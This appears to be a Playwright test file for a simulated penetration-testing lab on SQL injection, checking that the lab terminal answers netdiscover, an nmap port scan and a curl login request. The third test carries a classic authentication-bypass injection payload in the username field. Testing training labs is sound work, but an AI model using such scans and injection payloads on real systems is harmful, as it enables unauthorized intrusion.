// ── e2e/lab06.spec.ts ──────────────────────────────────────────────
// Lab 06 — SQL Injection & Database Exfiltration (192.168.40.0/24 → target .11)

import { test } from '@playwright/test';
import { navigateToLab, typeCommand, expectOutput } from './helpers';

test('Lab 06: netdiscover descubre hosts', async ({ page }) => {
  await navigateToLab(page, 'scenario-06');
  await typeCommand(page, 'netdiscover -r 192.168.40.0/24');
  await expectOutput(page, '192.168.40.');
});

test('Lab 06: nmap escanea puertos', async ({ page }) => {
  await navigateToLab(page, 'scenario-06');
  await typeCommand(page, 'netdiscover -r 192.168.40.0/24');
  await typeCommand(page, 'nmap -sS -p- --min-rate 5000 192.168.40.11');
  await expectOutput(page, '21/tcp');
  await expectOutput(page, '80/tcp');
});

test('Lab 06: curl SQLi en el login', async ({ page }) => {
  await navigateToLab(page, 'scenario-06');
  await typeCommand(page, 'netdiscover -r 192.168.40.0/24');
  await typeCommand(page, `curl -X POST http://192.168.40.11/login -d "username=' OR '1'='1&password=x"`);
  await expectOutput(page, 'Dashboard');
});